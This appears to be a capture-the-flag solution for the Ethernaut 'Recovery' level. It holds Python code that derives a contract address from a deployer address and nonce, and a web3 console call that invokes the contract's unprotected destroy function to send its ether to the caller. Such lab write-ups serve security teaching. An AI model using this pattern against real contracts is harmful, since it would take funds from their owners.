Ethernaut console
```
const st2 = new web3.eth.Contract(
  [{ "constant": false, "inputs": [{ "name": "_to", "type": "address" }], "name": "destroy", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }],
  "0x537b1B97326c62A8928550E8F009cBD983B4b963"
);
await st2.methods.destroy((await web3.eth.getAccounts())[0]).send({ from: (await web3.eth.getAccounts())[0] });
```
Python
```
from eth_utils import keccak, to_checksum_address
import rlp

def get_contract_address(sender, nonce):
    sender_bytes = bytes.fromhex(sender[2:])
    nonce_bytes = b'' if nonce == 0 else nonce.to_bytes((nonce.bit_length() + 7) // 8, 'big')
    encoded = rlp.encode([sender_bytes, nonce_bytes])
    return to_checksum_address(keccak(encoded)[12:])

recovery_address = "0x7AD153D2055f2a19D5ded27A11A86A6055368A6c"
nonce = 1
print(get_contract_address(recovery_address, nonce))
```
output:
```
0x537b1B97326c62A8928550E8F009cBD983B4b963
```
